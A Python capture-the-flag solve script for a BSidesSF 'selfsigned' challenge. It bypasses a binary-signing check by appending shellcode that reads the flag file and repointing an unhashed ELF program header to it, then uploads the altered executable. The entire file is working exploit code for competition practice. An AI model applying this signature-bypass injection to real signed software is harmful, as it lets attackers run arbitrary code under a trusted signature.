import requests
import struct
import io
from elftools.elf.elffile import ELFFile
from pwn import *

# Target URL
BASE_URL = "https://selfsigned-6c8c026e.challenges.bsidessf.net"
TARGET_BINARY = f"{BASE_URL}/selfsigned-amd64"
UPLOAD_URL = f"{BASE_URL}/upload"

def solve():
    print(f"[*] Downloading signed binary from {TARGET_BINARY}...")
    r = requests.get(TARGET_BINARY)
    if r.status_code != 200:
        print("[-] Failed to download base binary.")
        return
    
    data = bytearray(r.content)
    
    # Parse the ELF to find the entry point and program headers
    with io.BytesIO(data) as f:
        elf = ELFFile(f)
        e_entry = elf.header['e_entry']
        e_phoff = elf.header['e_phoff']
        e_phnum = elf.header['e_phnum']
        e_phentsize = elf.header['e_phentsize']
        
        # Find the PT_LOAD segment that covers the entry point
        target_seg_idx = -1
        target_seg_header = None
        for i in range(e_phnum):
            ph = elf.get_segment(i).header
            if ph['p_type'] == 'PT_LOAD' and (ph['p_flags'] & 1): # Executable
                if ph['p_vaddr'] <= e_entry < ph['p_vaddr'] + ph['p_memsz']:
                    target_seg_idx = i
                    target_seg_header = ph
                    break
        
    if target_seg_idx == -1:
        print("[-] Could not find executable segment covering entry point.")
        return

    print(f"[*] Found executable segment at index {target_seg_idx}")
    print(f"[*] Original Entry Point: {hex(e_entry)}")

    # Prepare shellcode
    context.arch = 'amd64'
    # We must pad the shellcode so that the entry point offset within the segment 
    # hits our code correctly.
    offset_in_segment = e_entry - target_seg_header['p_vaddr']
    shellcode_payload = asm(shellcraft.cat("/home/ctf/flag.txt") + shellcraft.exit(0))
    
    # Build the new segment content: NOPs until the entry point, then shellcode
    final_shellcode = b"\x90" * offset_in_segment + shellcode_payload
    
    # Append shellcode to the end of the file (in "untracked" space)
    shellcode_file_offset = len(data)
    # Align to page for safety
    while shellcode_file_offset % 0x1000 != 0:
        data.append(0)
        shellcode_file_offset += 1
    data += final_shellcode

    # Modify the Program Header Table entry (which is not hashed)
    # Phdr64: type(4), flags(4), offset(8), vaddr(8), paddr(8), filesz(8), memsz(8), align(8)
    phdr_ptr = e_phoff + (target_seg_idx * e_phentsize)
    
    # Update p_offset (at +8) to point to our shellcode
    struct.pack_into("<Q", data, phdr_ptr + 8, shellcode_file_offset)
    # Update p_filesz (at +32) and p_memsz (at +40)
    struct.pack_into("<Q", data, phdr_ptr + 32, len(final_shellcode))
    struct.pack_into("<Q", data, phdr_ptr + 40, len(final_shellcode))

    print(f"[*] Modified PHT segment {target_seg_idx} to point to offset {hex(shellcode_file_offset)}")

    # Upload the modified binary
    print("[*] Uploading hijacked signed binary...")
    files = {'file': ('exploit.elf', bytes(data), 'application/octet-stream')}
    resp = requests.post(UPLOAD_URL, files=files)

    if "CTF{" in resp.text:
        print("[+] Success! Flag found:")
        import re
        flag = re.findall(r"CTF\{.*?\}", resp.text)
        print(flag[0] if flag else resp.text)
    else:
        print("[-] Exploit failed or signature rejected.")
        print(resp.text)

if __name__ == "__main__":
    solve()